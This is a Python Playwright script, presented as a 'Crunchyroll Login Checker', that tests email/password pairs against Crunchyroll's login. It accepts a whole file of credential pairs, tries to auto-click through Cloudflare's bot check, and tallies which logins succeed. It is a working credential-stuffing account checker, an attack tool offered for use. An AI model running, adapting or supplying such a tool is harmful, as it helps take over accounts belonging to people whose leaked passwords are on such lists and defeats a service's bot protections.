import asyncio
import argparse
import sys
from playwright.async_api import async_playwright
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

HEADLESS = True

async def bypass_cloudflare(page, max_wait=120):
    start = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start) < max_wait:
        try:
            content = await page.content()
            url = page.url
            if "cloudflare" in content.lower() or "security verification" in content.lower():
                logger.info("Cloudflare detected – trying to auto‑click Verify")
                try:
                    verify_btn = await page.wait_for_selector(
                        "button:has-text('Verify'), button:has-text('I am human'), button:has-text('Verify you are human')",
                        timeout=3000
                    )
                    if verify_btn:
                        await verify_btn.click()
                        logger.info("Clicked 'Verify' button")
                        await asyncio.sleep(3)
                except:
                    logger.info("No clickable button – waiting for auto‑verification")
                    await asyncio.sleep(2)

                await asyncio.sleep(2)
                new_content = await page.content()
                new_url = page.url
                if ("cloudflare" not in new_content.lower() and
                    "security verification" not in new_content.lower()) or \
                   ("www.crunchyroll.com/" in new_url and "login" not in new_url):
                    logger.info("Cloudflare cleared")
                    return True
            else:
                logger.info("No Cloudflare detected")
                return True
        except Exception as e:
            logger.warning(f"Error in bypass_cloudflare: {e}")
            await asyncio.sleep(1)

    logger.error("Cloudflare bypass timed out")
    return False

async def login_crunchyroll(email: str, password: str) -> dict:
    result = {"success": False, "message": ""}
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=HEADLESS,
            slow_mo=50,
            args=['--incognito']
        )
        context = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            storage_state=None
        )
        page = await context.new_page()

        try:
            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
            logger.info("Navigating to SSO login")
            await page.goto(sso_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=30000)

            logger.info("Checking for Cloudflare")
            if not await bypass_cloudflare(page):
                result["message"] = "Cloudflare verification timed out"
                return result

            logger.info("Handling cookie consent")
            cookie_selectors = [
                "button:has-text('Accept All')",
                "button:has-text('Accept all')",
                "button[data-testid='accept-button']",
                "#onetrust-accept-btn-handler",
                ".onetrust-accept-btn-handler"
            ]
            for sel in cookie_selectors:
                try:
                    btn = await page.wait_for_selector(sel, timeout=2000)
                    if btn:
                        await btn.click()
                        logger.info(f"Clicked cookie button: {sel}")
                        await asyncio.sleep(1)
                        break
                except:
                    pass

            logger.info("Looking for email field")
            email_field = None
            email_selectors = [
                "input[name='email']",
                "input[type='email']",
                "input[name='login']",
                "input[id='email']",
                "input[placeholder*='Email']"
            ]
            for sel in email_selectors:
                try:
                    email_field = await page.wait_for_selector(sel, timeout=3000)
                    if email_field:
                        logger.info(f"Found email field: {sel}")
                        break
                except:
                    pass
            if not email_field:
                inputs = await page.query_selector_all("input[type='text'], input[type='email']")
                for inp in inputs:
                    if await inp.is_visible():
                        email_field = inp
                        break
            if not email_field:
                result["message"] = "Email field not found"
                return result
            await email_field.fill(email)
            await asyncio.sleep(1)

            logger.info("Looking for password field")
            password_field = None
            password_selectors = [
                "input[type='password']",
                "input[name='password']",
                "input[id='password']",
                "input[placeholder*='Password']"
            ]
            for sel in password_selectors:
                try:
                    password_field = await page.wait_for_selector(sel, timeout=3000)
                    if password_field:
                        logger.info(f"Found password field: {sel}")
                        break
                except:
                    pass
            if not password_field:
                pw_inputs = await page.query_selector_all("input[type='password']")
                if pw_inputs:
                    password_field = pw_inputs[0]
            if not password_field:
                result["message"] = "Password field not found"
                return result
            await password_field.fill(password)
            await asyncio.sleep(0.5)

            logger.info("Submitting login")
            submit_btn = None
            submit_selectors = [
                "button[type='submit']",
                "button:has-text('LOGIN')",
                "button:has-text('Sign In')",
                "button:has-text('NEXT')",
                "input[type='submit']"
            ]
            for sel in submit_selectors:
                try:
                    submit_btn = await page.wait_for_selector(sel, timeout=2000)
                    if submit_btn:
                        logger.info(f"Found submit button: {sel}")
                        break
                except:
                    pass
            if submit_btn:
                await submit_btn.click()
            else:
                await password_field.press("Enter")

            logger.info("Waiting for login response (up to 120s)")
            await asyncio.sleep(5)

            current_url = page.url
            if "www.crunchyroll.com/" in current_url and "login" not in current_url:
                content = await page.content()
                if "verifying" not in content.lower():
                    logger.info("Already on dashboard after submit")
                    result["success"] = True
                    result["message"] = "Login Successful!"
                    return result

            content = await page.content()
            if "cloudflare" in content.lower() or "security verification" in content.lower():
                logger.info("Cloudflare appeared after login – trying to bypass")
                if await bypass_cloudflare(page):
                    logger.info("Post‑login Cloudflare cleared")
                    await asyncio.sleep(3)
                else:
                    result["message"] = "Post‑login Cloudflare timed out"
                    return result

            try:
                await page.wait_for_load_state("networkidle", timeout=30000)
            except:
                pass

            final_url = page.url
            page_content = await page.content()

            if "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                result["message"] = "Wrong email or password"
            elif "www.crunchyroll.com/" in final_url and "login" not in final_url and "verifying" not in page_content.lower():
                result["success"] = True
                result["message"] = "Login Successful!"
            elif "sso.crunchyroll.com/login" in final_url:
                result["message"] = "Login not successful – check credentials"
            else:
                result["message"] = f"Unknown state – URL: {final_url}"

        except Exception as e:
            logger.error(f"Login error: {e}")
            result["message"] = f"Error: {str(e)[:150]}"

        finally:
            await browser.close()

    return result

def process_credentials(email: str, password: str):
    """Run login coroutine and return formatted result."""
    try:
        result = asyncio.run(login_crunchyroll(email, password))
        status = "SUCCESS" if result["success"] else "FAILED"
        # Mask email for privacy in output
        masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
        return f"{masked_email}: {status} - {result['message']}"
    except Exception as e:
        masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
        return f"{masked_email}: ERROR - {str(e)}"

def main():
    parser = argparse.ArgumentParser(description='Crunchyroll Login Checker (CLI Version)')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--email', help='Crunchyroll email address (single mode)')
    group.add_argument('--file', help='Path to txt file containing email password pairs (one per line)')
    parser.add_argument('--password', help='Crunchyroll password (required for single mode)')
    parser.add_argument('--headless', action='store_true', help='Run browser in headless mode (default: True)')
    parser.add_argument('--no-headless', dest='headless', action='store_false', help='Run browser with UI')
    parser.set_defaults(headless=True)

    args = parser.parse_args()

    global HEADLESS
    HEADLESS = args.headless

    if args.email:
        if not args.password:
            parser.error("--password is required when using --email")
        print(f"Processing single account: {args.email[:3]}***@{args.email.split('@')[1]}")
        print("Please wait 30-40 seconds...")
        result = process_credentials(args.email, args.password)
        print(result)
        sys.exit(0 if "SUCCESS" in result else 1)

    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            sys.exit(1)
        except Exception as e:
            print(f"Error reading file: {e}")
            sys.exit(1)

        if not lines:
            print("Error: File is empty.")
            sys.exit(1)

        print(f"Processing {len(lines)} accounts from {args.file}...")
        success_count = 0
        for i, line in enumerate(lines, 1):
            # Split first space: email is first token, password is rest
            parts = line.split(' ', 1)
            if len(parts) < 2:
                print(f"[{i}/{len(lines)}] INVALID FORMAT: '{line}' (expected: email password)")
                continue
            email, password = parts
            print(f"[{i}/{len(lines)}] Processing: {email[:3]}***@{email.split('@')[1] if '@' in email else email} ...", end=' ', flush=True)
            result = process_credentials(email, password)
            # result already formatted; print it
            print(result)
            if "SUCCESS" in result:
                success_count += 1

        print(f"\nSummary: {success_count}/{len(lines)} successful logins")
        sys.exit(0 if success_count > 0 else 1)

if __name__ == "__main__":
    main()